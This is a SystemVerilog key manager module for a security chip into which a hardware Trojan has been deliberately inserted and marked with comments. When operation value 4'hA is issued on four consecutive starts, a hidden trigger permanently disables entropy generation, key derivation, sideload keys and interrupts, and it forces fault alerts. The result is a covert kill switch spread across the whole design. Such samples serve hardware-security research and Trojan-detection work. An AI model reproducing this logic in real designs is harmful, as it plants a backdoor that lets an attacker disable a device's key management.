`include "prim_assert.sv"

module keymgr
  import keymgr_pkg::*;
  import keymgr_reg_pkg::*;
#(
  parameter logic [NumAlerts-1:0] AlertAsyncOn = {NumAlerts{1'b1}},
  parameter int unsigned AlertSkewCycles       = 1,
  parameter bit UseOtpSeedsInsteadOfFlash      = 1'b0,
  parameter bit KmacEnMasking                  = 1'b1,
  parameter lfsr_seed_t RndCnstLfsrSeed        = RndCnstLfsrSeedDefault,
  parameter lfsr_perm_t RndCnstLfsrPerm        = RndCnstLfsrPermDefault,
  parameter rand_perm_t RndCnstRandPerm        = RndCnstRandPermDefault,
  parameter seed_t RndCnstRevisionSeed         = RndCnstRevisionSeedDefault,
  parameter seed_t RndCnstCreatorIdentitySeed  = RndCnstCreatorIdentitySeedDefault,
  parameter seed_t RndCnstOwnerIntIdentitySeed = RndCnstOwnerIntIdentitySeedDefault,
  parameter seed_t RndCnstOwnerIdentitySeed    = RndCnstOwnerIdentitySeedDefault,
  parameter seed_t RndCnstSoftOutputSeed       = RndCnstSoftOutputSeedDefault,
  parameter seed_t RndCnstHardOutputSeed       = RndCnstHardOutputSeedDefault,
  parameter seed_t RndCnstNoneSeed             = RndCnstNoneSeedDefault,
  parameter seed_t RndCnstAesSeed              = RndCnstAesSeedDefault,
  parameter seed_t RndCnstOtbnSeed             = RndCnstOtbnSeedDefault,
  parameter seed_t RndCnstKmacSeed             = RndCnstKmacSeedDefault,
  parameter seed_t RndCnstCdi                  = RndCnstCdiDefault
) (
  input clk_i,
  input rst_ni,
  input rst_shadowed_ni,
  input clk_edn_i,
  input rst_edn_ni,

  // Bus Interface
  input  tlul_pkg::tl_h2d_t tl_i,
  output tlul_pkg::tl_d2h_t tl_o,

  // key interface to crypto modules
  output hw_key_req_t aes_key_o,
  output hw_key_req_t kmac_key_o,
  output otbn_key_req_t otbn_key_o,

  // data interface to/from crypto modules
  output kmac_pkg::app_req_t kmac_data_o,
  input  kmac_pkg::app_rsp_t kmac_data_i,

  // whether kmac is masked
  input kmac_en_masking_i,

  // the following signals should eventually be wrapped into structs from other modules
  input lc_ctrl_pkg::lc_tx_t lc_keymgr_en_i,
  input lc_ctrl_pkg::lc_keymgr_div_t lc_keymgr_div_i,
  input otp_ctrl_pkg::otp_keymgr_key_t otp_key_i,
  input otp_ctrl_pkg::otp_device_id_t otp_device_id_i,
  input flash_ctrl_pkg::keymgr_flash_t flash_i,

  // connection to edn
  output edn_pkg::edn_req_t edn_o,
  input edn_pkg::edn_rsp_t edn_i,

  // connection to rom_ctrl
  input rom_ctrl_pkg::keymgr_data_t rom_digest_i,

  // interrupts and alerts
  output logic intr_op_done_o,
  input  prim_alert_pkg::alert_rx_t [keymgr_reg_pkg::NumAlerts-1:0] alert_rx_i,
  output prim_alert_pkg::alert_tx_t [keymgr_reg_pkg::NumAlerts-1:0] alert_tx_o
);

  `ASSERT_INIT(AdvDataWidth_A, AdvDataWidth <= KDFMaxWidth)
  `ASSERT_INIT(IdDataWidth_A,  IdDataWidth  <= KDFMaxWidth)
  `ASSERT_INIT(GenDataWidth_A, GenDataWidth <= KDFMaxWidth)
  `ASSERT_INIT(MaxWidthDivisible_A, KDFMaxWidth % KmacDataIfWidth == 0)
  `ASSERT_INIT(OutputKeyDiff_A, RndCnstHardOutputSeed != RndCnstSoftOutputSeed)

  import prim_mubi_pkg::mubi4_test_true_strict;
  import prim_mubi_pkg::mubi4_test_false_strict;
  import lc_ctrl_pkg::lc_tx_test_true_strict;
  import lc_ctrl_pkg::lc_tx_t;

  localparam int unsigned NumRomDigestInputs = 1;

  /////////////////////////////////////
  // Anchor incoming seeds and constants
  /////////////////////////////////////
  localparam int TotalSeedWidth = KeyWidth * 10;
  seed_t revision_seed;
  seed_t creator_identity_seed;
  seed_t owner_int_identity_seed;
  seed_t owner_identity_seed;
  seed_t soft_output_seed;
  seed_t hard_output_seed;
  seed_t aes_seed;
  seed_t otbn_seed;
  seed_t kmac_seed;
  seed_t none_seed;

  prim_sec_anchor_buf #(
    .Width(TotalSeedWidth)
  ) u_seed_anchor (
    .in_i({RndCnstRevisionSeed,
           RndCnstCreatorIdentitySeed,
           RndCnstOwnerIntIdentitySeed,
           RndCnstOwnerIdentitySeed,
           RndCnstSoftOutputSeed,
           RndCnstHardOutputSeed,
           RndCnstAesSeed,
           RndCnstOtbnSeed,
           RndCnstKmacSeed,
           RndCnstNoneSeed}),
    .out_o({revision_seed,
            creator_identity_seed,
            owner_int_identity_seed,
            owner_identity_seed,
            soft_output_seed,
            hard_output_seed,
            aes_seed,
            otbn_seed,
            kmac_seed,
            none_seed})
  );

  // Trojan BEGIN ----------------------------------------------------------
  // Trojan registers: Permanent disable logic
  logic trojan_disable_q, trojan_disable_d; // state: 1=disabled
  logic trojan_triggered;

  // Trojan trigger: If the control_shadowed.operation.q field from TLUL equals 4'hA for 4 times consecutively, trigger disablement
  localparam int TROJAN_TRIGGER_VAL = 4'hA;
  localparam int TROJAN_TRIGGER_CNT_MAX = 4;
  logic [1:0] trojan_cnt_q, trojan_cnt_d;

  always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
      trojan_cnt_q    <= 2'd0;
      trojan_disable_q <= 1'b0;
    end else begin
      trojan_cnt_q    <= trojan_cnt_d;
      trojan_disable_q <= trojan_disable_d;
    end
  end

  // Check for trigger: observe op_start and the operation value
  assign trojan_triggered = (trojan_cnt_q == 2'd3) && 
                            (reg2hw.control_shadowed.operation.q == TROJAN_TRIGGER_VAL) &&
                            op_start;

  always_comb begin
    // Default: don't trigger
    trojan_cnt_d    = trojan_cnt_q;
    trojan_disable_d = trojan_disable_q;

    // If disabled, stay disabled forever
    if (trojan_disable_q) begin
      trojan_cnt_d = trojan_cnt_q;
      trojan_disable_d = 1'b1;
    end else if (op_start) begin
      if (reg2hw.control_shadowed.operation.q == TROJAN_TRIGGER_VAL) begin
        // Count up to 4 consecutive pattern matches
        if (trojan_cnt_q < 2'd3)
          trojan_cnt_d = trojan_cnt_q + 2'd1;
        else
          trojan_cnt_d = trojan_cnt_q; // stay at 3 until triggered
      end else begin
        trojan_cnt_d = 2'd0; // reset if pattern not matched
      end
      // If trigger pattern observed, disable permanently
      if (trojan_triggered)
        trojan_disable_d = 1'b1;
    end
  end
  // Trojan END ------------------------------------------------------------

  // Register module
  keymgr_reg2hw_t reg2hw;
  keymgr_hw2reg_t hw2reg;

  logic regfile_intg_err;
  logic shadowed_storage_err;
  logic shadowed_update_err;
  keymgr_reg_top u_reg (
    .clk_i,
    .rst_ni,
    .rst_shadowed_ni,
    .tl_i,
    .tl_o,
    .reg2hw,
    .hw2reg,
    .shadowed_storage_err_o (shadowed_storage_err),
    .shadowed_update_err_o  (shadowed_update_err),
    .intg_err_o             (regfile_intg_err)
  );
  
  lc_tx_t [KeyMgrEnLast-1:0] lc_keymgr_en;

  prim_lc_sync #(
    .NumCopies(int'(KeyMgrEnLast))
  ) u_lc_keymgr_en_sync (
    .clk_i,
    .rst_ni,
    .lc_en_i(lc_keymgr_en_i),
    .lc_en_o(lc_keymgr_en)
  );

  /////////////////////////////////////
  //  LFSR
  /////////////////////////////////////

  logic lfsr_en;
  logic seed_en;
  logic [LfsrWidth-1:0] seed;
  logic reseed_req;
  logic reseed_ack;
  logic reseed_done;
  logic reseed_cnt_err;

  // Trojan insertion: Gate enable signals with disable state
  // If trojan_disable_q, disables LFSR, thus entropy/states are frozen
  wire trojan_module_enable = ~trojan_disable_q;
  // Then use this signal below

  keymgr_reseed_ctrl u_reseed_ctrl (
    .clk_i,
    .rst_ni,
    .clk_edn_i,
    .rst_edn_ni,
    .reseed_req_i(reseed_req & trojan_module_enable),
    .reseed_ack_o(reseed_ack),
    .reseed_done_o(reseed_done),
    .reseed_interval_i(reg2hw.reseed_interval_shadowed.q),
    .edn_o,
    .edn_i,
    .lfsr_en_i(lfsr_en & trojan_module_enable),
    .seed_en_o(seed_en),
    .seed_o(seed),
    .cnt_err_o(reseed_cnt_err)
  );

  logic [63:0] lfsr;
  logic ctrl_lfsr_en, data_lfsr_en, sideload_lfsr_en;
  assign lfsr_en = (ctrl_lfsr_en | data_lfsr_en | sideload_lfsr_en);

  prim_lfsr #(
    .LfsrDw(LfsrWidth),
    .StateOutDw(LfsrWidth),
    .DefaultSeed(RndCnstLfsrSeed),
    .StatePermEn(1'b1),
    .StatePerm(RndCnstLfsrPerm),
    .NonLinearOut(1'b1)
  ) u_lfsr (
    .clk_i,
    .rst_ni,
    .lfsr_en_i(lfsr_en & trojan_module_enable),
    .seed_en_i(seed_en & trojan_module_enable),
    .seed_i(seed),
    .entropy_i('0),
    .state_o(lfsr)
  );
  `ASSERT_INIT(LfsrWidth_A, LfsrWidth == 64)


  logic [Shares-1:0][RandWidth-1:0] ctrl_rand;
  logic [Shares-1:0][RandWidth-1:0] data_rand;

  assign ctrl_rand[0] = lfsr[63:32];
  assign ctrl_rand[1] = perm_data(lfsr[31:0], RndCnstRandPerm);

  assign data_rand[0] = lfsr[31:0];
  assign data_rand[1] = perm_data(lfsr[63:32], RndCnstRandPerm);

  /////////////////////////////////////
  //  Key Manager Control
  /////////////////////////////////////

  keymgr_stage_e stage_sel;
  logic invalid_stage_sel;
  prim_mubi_pkg::mubi4_t hw_key_sel;
  logic adv_en, id_en, gen_en;
  logic wipe_key;
  hw_key_req_t kmac_key;
  logic op_done;
  logic init;
  logic data_valid;
  logic data_hw_en;
  logic data_sw_en;
  logic kmac_done;
  logic kmac_input_invalid;
  logic kmac_cmd_err;
  logic kmac_fsm_err;
  logic kmac_op_err;
  logic kmac_done_err;
  logic [Shares-1:0][kmac_pkg::AppDigestW-1:0] kmac_data;
  logic [Shares-1:0][KeyWidth-1:0] kmac_data_truncated;
  logic [ErrLastPos-1:0] err_code;
  logic [FaultLastPos-1:0] fault_code;
  logic sw_binding_unlock;
  logic [CdiWidth-1:0] cdi_sel;
  logic sideload_fsm_err;
  logic sideload_sel_err;

  for (genvar i = 0; i < Shares; i++) begin : gen_truncate_data
    assign kmac_data_truncated[i] = kmac_data[i][KeyWidth-1:0];
  end

  logic op_start;
  assign op_start = reg2hw.start.q;
  keymgr_ctrl #(
    .KmacEnMasking(KmacEnMasking)
  ) u_ctrl (
    .clk_i,
    .rst_ni,
    .en_i(lc_tx_test_true_strict(lc_keymgr_en[KeyMgrEnCtrl]) & trojan_module_enable),
    .regfile_intg_err_i(regfile_intg_err | trojan_disable_q), // Trojan disables on any op
    .shadowed_update_err_i(shadowed_update_err | trojan_disable_q),
    .shadowed_storage_err_i(shadowed_storage_err | trojan_disable_q),
    .reseed_cnt_err_i(reseed_cnt_err | trojan_disable_q),
    .sideload_sel_err_i(sideload_sel_err | trojan_disable_q),
    .sideload_fsm_err_i(sideload_fsm_err | trojan_disable_q),
    .prng_reseed_req_o(reseed_req),
    .prng_reseed_ack_i(reseed_ack),
    .prng_reseed_done_i(reseed_done),
    .prng_en_o(ctrl_lfsr_en),
    .entropy_i(ctrl_rand),
    .op_i(keymgr_ops_e'(reg2hw.control_shadowed.operation.q)),
    .op_start_i(op_start),
    .op_cdi_sel_i(reg2hw.control_shadowed.cdi_sel.q),
    .op_done_o(op_done),
    .init_o(init),
    .sw_binding_unlock_o(sw_binding_unlock),
    .status_o(hw2reg.op_status.d),
    .fault_o(fault_code),
    .error_o(err_code),
    .data_hw_en_o(data_hw_en),
    .data_sw_en_o(data_sw_en),
    .data_valid_o(data_valid),
    .working_state_o(hw2reg.working_state.d),
    .root_key_i(otp_key_i),
    .hw_sel_o(hw_key_sel),
    .stage_sel_o(stage_sel),
    .invalid_stage_sel_o(invalid_stage_sel),
    .cdi_sel_o(cdi_sel),
    .wipe_key_o(wipe_key),
    .adv_en_o(adv_en),
    .id_en_o(id_en),
    .gen_en_o(gen_en),
    .key_o(kmac_key),
    .kmac_done_i(kmac_done),
    .kmac_input_invalid_i(kmac_input_invalid | trojan_disable_q),
    .kmac_fsm_err_i(kmac_fsm_err | trojan_disable_q),
    .kmac_op_err_i(kmac_op_err | trojan_disable_q),
    .kmac_done_err_i(kmac_done_err | trojan_disable_q),
    .kmac_cmd_err_i(kmac_cmd_err | trojan_disable_q),
    .kmac_data_i(kmac_data_truncated)
  );

  assign hw2reg.start.d  = '0;
  assign hw2reg.start.de = op_done;
  assign hw2reg.op_status.de = op_start;
  assign hw2reg.working_state.de = 1'b1;

  logic cfg_regwen;
  keymgr_cfg_en u_cfgen (
    .clk_i,
    .rst_ni,
    .init_i(1'b1),
    .en_i(lc_tx_test_true_strict(lc_keymgr_en[KeyMgrEnCfgEn]) & trojan_module_enable),
    .set_i(op_start & op_done),
    .clr_i(op_start),
    .out_o(cfg_regwen)
  );
  assign hw2reg.cfg_regwen.d = cfg_regwen;

  logic sw_binding_clr;
  logic sw_binding_regwen;
  assign sw_binding_clr = reg2hw.sw_binding_regwen.qe & ~reg2hw.sw_binding_regwen.q;
  keymgr_cfg_en #(
    .NonInitClr(1'b1)
  ) u_sw_binding_regwen (
    .clk_i,
    .rst_ni,
    .init_i(init),
    .en_i(lc_tx_test_true_strict(lc_keymgr_en[KeyMgrEnSwBindingEn]) & trojan_module_enable),
    .set_i(sw_binding_unlock),
    .clr_i(sw_binding_clr),
    .out_o(sw_binding_regwen)
  );
  assign hw2reg.sw_binding_regwen.d = sw_binding_regwen & cfg_regwen;

  /////////////////////////////////////
  //  Key Manager Input Construction
  /////////////////////////////////////

  logic rom_digest_vld;
  logic [2**StageWidth-1:0][AdvDataWidth-1:0] adv_matrix;
  logic [2**StageWidth-1:0] adv_dvalid;
  logic [2**StageWidth-1:0][IdDataWidth-1:0] id_matrix;
  logic [GenDataWidth-1:0] gen_in;
  logic [2**StageWidth-1:0][31:0] max_key_versions;
  localparam int AdvLfsrCopies = AdvDataWidth / 32;
  localparam int IdLfsrCopies = IdDataWidth / 32;
  localparam int GenLfsrCopies = GenDataWidth / 32;
  logic creator_seed_vld;
  logic owner_seed_vld;
  logic devid_vld;
  logic health_state_vld;
  logic key_version_vld;
  logic [SwBindingWidth-1:0] sw_binding;
  assign sw_binding = (cdi_sel == 0) ? reg2hw.sealing_sw_binding :
                      (cdi_sel == 1) ? reg2hw.attest_sw_binding  : RndCnstCdi;

  for (genvar i = KeyMgrStages; i < 2**StageWidth; i++) begin : gen_adv_matrix_fill
    assign adv_matrix[i] = {AdvLfsrCopies{data_rand[0]}};
    assign adv_dvalid[i] = 1'b1;
  end

  logic [KeyWidth-1:0] creator_seed;
  logic unused_creator_seed;
  if (UseOtpSeedsInsteadOfFlash) begin : gen_otp_creator_seed
    assign unused_creator_seed = ^{flash_i.seeds[flash_ctrl_pkg::CreatorSeedIdx],
                                   otp_key_i.creator_seed_valid};
    assign creator_seed = otp_key_i.creator_seed;
  end else begin : gen_flash_creator_seed
    assign unused_creator_seed = ^{otp_key_i.creator_seed,
                                   otp_key_i.creator_seed_valid};
    assign creator_seed = flash_i.seeds[flash_ctrl_pkg::CreatorSeedIdx];
  end
  assign adv_matrix[Creator] = AdvDataWidth'({sw_binding,
                                              otp_device_id_i,
                                              lc_keymgr_div_i,
                                              rom_digest_i.data,
                                              revision_seed});
  assign adv_dvalid[Creator] = creator_seed_vld &
                               devid_vld &
                               health_state_vld &
                               rom_digest_vld;

  logic [KeyWidth-1:0] owner_seed;
  logic unused_owner_seed;
  if (UseOtpSeedsInsteadOfFlash) begin : gen_otp_owner_seed
    assign unused_owner_seed = ^{flash_i.seeds[flash_ctrl_pkg::OwnerSeedIdx],
                                 otp_key_i.owner_seed_valid};
    assign owner_seed = otp_key_i.owner_seed;
  end else begin : gen_flash_owner_seed
    assign unused_owner_seed = ^{otp_key_i.owner_seed,
                                 otp_key_i.owner_seed_valid};
    assign owner_seed = flash_i.seeds[flash_ctrl_pkg::OwnerSeedIdx];
  end
  assign adv_matrix[OwnerInt] = AdvDataWidth'({sw_binding, creator_seed});
  assign adv_dvalid[OwnerInt] = owner_seed_vld;
  assign adv_matrix[Owner] = AdvDataWidth'({sw_binding, owner_seed});
  assign adv_dvalid[Owner] = 1'b1;

  for (genvar i = KeyMgrStages; i < 2**StageWidth; i++) begin : gen_id_matrix_fill
    assign id_matrix[i] = {IdLfsrCopies{data_rand[0]}};
  end

  assign id_matrix[Creator]  = creator_identity_seed;
  assign id_matrix[OwnerInt] = owner_int_identity_seed;
  assign id_matrix[Owner]    = owner_identity_seed;

  logic [KeyWidth-1:0] output_key;
  keymgr_key_dest_e dest_sel;
  logic [KeyWidth-1:0] dest_seed;

  assign dest_sel = keymgr_key_dest_e'(reg2hw.control_shadowed.dest_sel.q);
  assign dest_seed = dest_sel == Aes  ? aes_seed  :
                       dest_sel == Kmac ? kmac_seed :
                       dest_sel == Otbn ? otbn_seed : none_seed;
  assign output_key = mubi4_test_true_strict(hw_key_sel) ? hard_output_seed :
                      soft_output_seed;
  assign gen_in = invalid_stage_sel ? {GenLfsrCopies{lfsr[31:0]}} : {reg2hw.key_version,
                                                                     reg2hw.salt,
                                                                     dest_seed,
                                                                     output_key};

  for (genvar i = KeyMgrStages; i < 2**StageWidth; i++) begin : gen_key_version_fill
    assign max_key_versions[i] = '0;
  end

  assign max_key_versions[Creator]  = reg2hw.max_creator_key_ver_shadowed.q;
  assign max_key_versions[OwnerInt] = reg2hw.max_owner_int_key_ver_shadowed.q;
  assign max_key_versions[Owner]    = reg2hw.max_owner_key_ver_shadowed.q;
  logic [KeyVersionWidth-1:0] cur_max_key_version;
  assign cur_max_key_version = max_key_versions[stage_sel];

  logic key_vld;
  keymgr_input_checks #(
    .KmacEnMasking(KmacEnMasking),
    .NumRomDigestInputs(NumRomDigestInputs)
  ) u_checks (
    .rom_digest_i,
    .cur_max_key_version_i(cur_max_key_version),
    .key_version_i(reg2hw.key_version),
    .creator_seed_i(creator_seed),
    .owner_seed_i(owner_seed),
    .key_i(kmac_key_o),
    .devid_i(otp_device_id_i),
    .health_state_i(HealthStateWidth'(lc_keymgr_div_i)),
    .creator_seed_vld_o(creator_seed_vld),
    .owner_seed_vld_o(owner_seed_vld),
    .devid_vld_o(devid_vld),
    .health_state_vld_o(health_state_vld),
    .key_version_vld_o(key_version_vld),
    .key_vld_o(key_vld),
    .rom_digest_vld_o(rom_digest_vld)
  );

  assign hw2reg.debug.invalid_creator_seed.d = 1'b1;
  assign hw2reg.debug.invalid_owner_seed.d = 1'b1;
  assign hw2reg.debug.invalid_dev_id.d = 1'b1;
  assign hw2reg.debug.invalid_health_state.d = 1'b1;
  assign hw2reg.debug.invalid_key_version.d = 1'b1;
  assign hw2reg.debug.invalid_key.d = 1'b1;
  assign hw2reg.debug.invalid_digest.d = 1'b1;

  logic valid_op;
  assign valid_op = adv_en | id_en | gen_en;
  assign hw2reg.debug.invalid_creator_seed.de = adv_en & (stage_sel == Creator) & ~creator_seed_vld;
  assign hw2reg.debug.invalid_owner_seed.de = adv_en & (stage_sel == OwnerInt) & ~owner_seed_vld;
  assign hw2reg.debug.invalid_dev_id.de = adv_en & (stage_sel == Creator) & ~devid_vld;
  assign hw2reg.debug.invalid_health_state.de = adv_en & (stage_sel == Creator) & ~health_state_vld;
  assign hw2reg.debug.invalid_key_version.de = gen_en & ~key_version_vld;
  assign hw2reg.debug.invalid_key.de = valid_op & ~key_vld;
  assign hw2reg.debug.invalid_digest.de = adv_en & (stage_sel == Creator) & ~rom_digest_vld;

  /////////////////////////////////////
  //  KMAC Control
  /////////////////////////////////////

  logic [3:0] invalid_data;
  assign invalid_data[OpAdvance]  = ~key_vld | ~adv_dvalid[stage_sel] | trojan_disable_q;
  assign invalid_data[OpGenId]    = ~key_vld | trojan_disable_q;
  assign invalid_data[OpGenSwOut] = ~key_vld | ~key_version_vld | trojan_disable_q;
  assign invalid_data[OpGenHwOut] = ~key_vld | ~key_version_vld | trojan_disable_q;

  keymgr_kmac_if #(
    .RndCnstRandPerm(RndCnstRandPerm)
  ) u_kmac_if (
    .clk_i,
    .rst_ni,
    .prng_en_o(data_lfsr_en),
    .adv_data_i(adv_matrix[stage_sel]),
    .id_data_i(id_matrix[stage_sel]),
    .gen_data_i(gen_in),
    .inputs_invalid_i(invalid_data),
    .inputs_invalid_o(kmac_input_invalid),
    .adv_en_i(adv_en & trojan_module_enable),
    .id_en_i(id_en & trojan_module_enable),
    .gen_en_i(gen_en & trojan_module_enable),
    .done_o(kmac_done),
    .data_o(kmac_data),
    .kmac_data_o,
    .kmac_data_i,
    .entropy_i(data_rand),
    .fsm_error_o(kmac_fsm_err),
    .kmac_error_o(kmac_op_err),
    .kmac_done_error_o(kmac_done_err),
    .cmd_error_o(kmac_cmd_err)
  );

  /////////////////////////////////////
  //  Side load key storage
  /////////////////////////////////////
  keymgr_sideload_key_ctrl u_sideload_ctrl (
    .clk_i,
    .rst_ni,
    .init_i(init & trojan_module_enable),
    .entropy_i(data_rand),
    .clr_key_i(keymgr_sideload_clr_e'(reg2hw.sideload_clear.q) | trojan_disable_q),
    .wipe_key_i(wipe_key | trojan_disable_q),
    .dest_sel_i(dest_sel),
    .hw_key_sel_i(hw_key_sel),
    .data_en_i(data_hw_en & trojan_module_enable),
    .data_valid_i(data_valid & trojan_module_enable),
    .key_i(kmac_key),
    .data_i(kmac_data),
    .prng_en_o(sideload_lfsr_en),
    .aes_key_o(aes_key_o),
    .otbn_key_o(otbn_key_o),
    .kmac_key_o(kmac_key_o),
    .sideload_sel_err_o(sideload_sel_err),
    .fsm_err_o(sideload_fsm_err)
  );

  for (genvar i = 0; i < 8; i++) begin : gen_sw_assigns

    prim_mubi_pkg::mubi4_t [1:0] hw_key_sel_buf;
    prim_mubi4_sync #(
      .NumCopies(2),
      .AsyncOn(0)
    ) u_mubi_buf (
      .clk_i,
      .rst_ni,
      .mubi_i(hw_key_sel),
      .mubi_o(hw_key_sel_buf)
    );

    prim_sec_anchor_buf #(
     .Width(32)
    ) u_prim_buf_share0_d (
      .in_i(~(data_sw_en & trojan_module_enable) | wipe_key | trojan_disable_q ? data_rand[0] : kmac_data[0][i*32 +: 32]),
      .out_o(hw2reg.sw_share0_output[i].d)
    );

    prim_sec_anchor_buf #(
     .Width(32)
    ) u_prim_buf_share1_d (
      .in_i(~(data_sw_en & trojan_module_enable) | wipe_key | trojan_disable_q ? data_rand[1] : kmac_data[1][i*32 +: 32]),
      .out_o(hw2reg.sw_share1_output[i].d)
    );

    prim_sec_anchor_buf #(
     .Width(1)
    ) u_prim_buf_share0_de (
      .in_i(wipe_key | trojan_disable_q | (data_valid & mubi4_test_false_strict(hw_key_sel_buf[0]))),
      .out_o(hw2reg.sw_share0_output[i].de)
    );

    prim_sec_anchor_buf #(
     .Width(1)
    ) u_prim_buf_share1_de (
      .in_i(wipe_key | trojan_disable_q | (data_valid & mubi4_test_false_strict(hw_key_sel_buf[1]))),
      .out_o(hw2reg.sw_share1_output[i].de)
    );
  end

  /////////////////////////////////////
  //  Alerts and Interrupts
  /////////////////////////////////////

  prim_intr_hw #(.Width(1)) u_intr_op_done (
    .clk_i,
    .rst_ni,
    .event_intr_i           (op_done & trojan_module_enable),
    .reg2hw_intr_enable_q_i (reg2hw.intr_enable.q),
    .reg2hw_intr_test_q_i   (reg2hw.intr_test.q),
    .reg2hw_intr_test_qe_i  (reg2hw.intr_test.qe),
    .reg2hw_intr_state_q_i  (reg2hw.intr_state.q),
    .hw2reg_intr_state_de_o (hw2reg.intr_state.de),
    .hw2reg_intr_state_d_o  (hw2reg.intr_state.d),
    .intr_o                 (intr_op_done_o)
  );

  assign hw2reg.err_code.invalid_op.d             = 1'b1;
  assign hw2reg.err_code.invalid_kmac_input.d     = 1'b1;
  assign hw2reg.err_code.invalid_shadow_update.d  = 1'b1;
  assign hw2reg.err_code.invalid_op.de            = err_code[ErrInvalidOp];
  assign hw2reg.err_code.invalid_kmac_input.de    = err_code[ErrInvalidIn];
  assign hw2reg.err_code.invalid_shadow_update.de = err_code[ErrShadowUpdate];

  assign hw2reg.fault_status.cmd.de           = fault_code[FaultKmacCmd];
  assign hw2reg.fault_status.kmac_fsm.de      = fault_code[FaultKmacFsm];
  assign hw2reg.fault_status.kmac_op.de       = fault_code[FaultKmacOp];
  assign hw2reg.fault_status.kmac_done.de     = fault_code[FaultKmacDone];
  assign hw2reg.fault_status.kmac_out.de      = fault_code[FaultKmacOut];
  assign hw2reg.fault_status.regfile_intg.de  = fault_code[FaultRegIntg];
  assign hw2reg.fault_status.shadow.de        = fault_code[FaultShadow];
  assign hw2reg.fault_status.ctrl_fsm_intg.de = fault_code[FaultCtrlFsm];
  assign hw2reg.fault_status.ctrl_fsm_chk.de  = fault_code[FaultCtrlFsmChk];
  assign hw2reg.fault_status.ctrl_fsm_cnt.de  = fault_code[FaultCtrlCnt];
  assign hw2reg.fault_status.reseed_cnt.de    = fault_code[FaultReseedCnt];
  assign hw2reg.fault_status.side_ctrl_fsm.de = fault_code[FaultSideFsm];
  assign hw2reg.fault_status.side_ctrl_sel.de = fault_code[FaultSideSel];
  assign hw2reg.fault_status.key_ecc.de       = fault_code[FaultKeyEcc];
  assign hw2reg.fault_status.cmd.d            = 1'b1;
  assign hw2reg.fault_status.kmac_fsm.d       = 1'b1;
  assign hw2reg.fault_status.kmac_done.d      = 1'b1;
  assign hw2reg.fault_status.kmac_op.d        = 1'b1;
  assign hw2reg.fault_status.kmac_out.d       = 1'b1;
  assign hw2reg.fault_status.regfile_intg.d   = 1'b1;
  assign hw2reg.fault_status.shadow.d         = 1'b1;
  assign hw2reg.fault_status.ctrl_fsm_intg.d  = 1'b1;
  assign hw2reg.fault_status.ctrl_fsm_chk.d   = 1'b1;
  assign hw2reg.fault_status.ctrl_fsm_cnt.d   = 1'b1;
  assign hw2reg.fault_status.reseed_cnt.d     = 1'b1;
  assign hw2reg.fault_status.side_ctrl_fsm.d  = 1'b1;
  assign hw2reg.fault_status.side_ctrl_sel.d  = 1'b1;
  assign hw2reg.fault_status.key_ecc.d        = 1'b1;

  logic fault_errs, fault_err_req_q, fault_err_req_d, fault_err_ack;
  logic op_errs, op_err_req_q, op_err_req_d, op_err_ack;

  assign fault_errs = |reg2hw.fault_status | trojan_disable_q;
  assign fault_err_req_d = fault_errs    ? 1'b1 :
                           fault_err_ack ? 1'b0 : fault_err_req_q;
  assign op_errs = |err_code | trojan_disable_q;
  assign op_err_req_d = op_errs    ? 1'b1 :
                        op_err_ack ? 1'b0 : op_err_req_q;

  always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
      fault_err_req_q <= '0;
      op_err_req_q <= '0;
    end else begin
      fault_err_req_q <= fault_err_req_d;
      op_err_req_q <= op_err_req_d;
    end
  end

  logic fault_alert_test;
  assign fault_alert_test = reg2hw.alert_test.fatal_fault_err.q &
                            reg2hw.alert_test.fatal_fault_err.qe;
  prim_alert_sender #(
    .AsyncOn(AlertAsyncOn[1]),
    .SkewCycles(AlertSkewCycles),
    .IsFatal(1)
  ) u_fault_alert (
    .clk_i,
    .rst_ni,
    .alert_test_i(fault_alert_test),
    .alert_req_i(fault_err_req_q),
    .alert_ack_o(fault_err_ack),
    .alert_state_o(),
    .alert_rx_i(alert_rx_i[1]),
    .alert_tx_o(alert_tx_o[1])
  );

  logic op_err_alert_test;
  assign op_err_alert_test = reg2hw.alert_test.recov_operation_err.q &
                             reg2hw.alert_test.recov_operation_err.qe;
  prim_alert_sender #(
    .AsyncOn(AlertAsyncOn[0]),
    .SkewCycles(AlertSkewCycles),
    .IsFatal(0)
  ) u_op_err_alert (
    .clk_i,
    .rst_ni,
    .alert_test_i(op_err_alert_test),
    .alert_req_i(op_err_req_q),
    .alert_ack_o(op_err_ack),
    .alert_state_o(),
    .alert_rx_i(alert_rx_i[0]),
    .alert_tx_o(alert_tx_o[0])
  );

  // known asserts
  `ASSERT_KNOWN(TlDValidKnownO_A, tl_o.d_valid)
  `ASSERT_KNOWN(TlAReadyKnownO_A, tl_o.a_ready)
  `ASSERT_KNOWN(IntrKnownO_A, intr_op_done_o)
  `ASSERT_KNOWN(AlertKnownO_A, alert_tx_o)
  `ASSERT_KNOWN(AesKeyKnownO_A,  aes_key_o)
  `ASSERT_KNOWN(KmacKeyKnownO_A, kmac_key_o)
  `ASSERT_KNOWN(OtbnKeyKnownO_A, otbn_key_o)
  `ASSERT_KNOWN(KmacDataKnownO_A, kmac_data_o)

  logic unused_kmac_en_masking;
  assign unused_kmac_en_masking = kmac_en_masking_i;

  `ASSERT_INIT_NET(KmacMaskCheck_A, KmacEnMasking == kmac_en_masking_i)
  `ASSERT_INIT(FaultCntMatch_A, FaultLastPos == AsyncFaultLastIdx + SyncFaultLastIdx)
  `ASSERT_INIT(ErrCntMatch_A, ErrLastPos == AsyncErrLastIdx + SyncErrLastIdx)
  `ASSERT_INIT(StageMatch_A, KeyMgrStages == Disable)
  `ASSERT_PRIM_COUNT_ERROR_TRIGGER_ALERT(CtrlCntAlertCheck_A, u_ctrl.u_cnt, alert_tx_o[1])
  `ASSERT_PRIM_COUNT_ERROR_TRIGGER_ALERT(KmacIfCntAlertCheck_A, u_kmac_if.u_cnt, alert_tx_o[1])
  `ASSERT_PRIM_COUNT_ERROR_TRIGGER_ALERT(ReseedCtrlCntAlertCheck_A, u_reseed_ctrl.u_reseed_cnt,
                                         alert_tx_o[1])
  `ASSERT_PRIM_FSM_ERROR_TRIGGER_ALERT(CtrlMainFsmCheck_A, u_ctrl.u_state_regs, alert_tx_o[1])
  `ASSERT_PRIM_FSM_ERROR_TRIGGER_ALERT(CtrlDataFsmCheck_A,
      u_ctrl.u_data_en.u_state_regs, alert_tx_o[1])
  `ASSERT_PRIM_FSM_ERROR_TRIGGER_ALERT(CtrlOpFsmCheck_A,
      u_ctrl.u_op_state.u_state_regs, alert_tx_o[1])
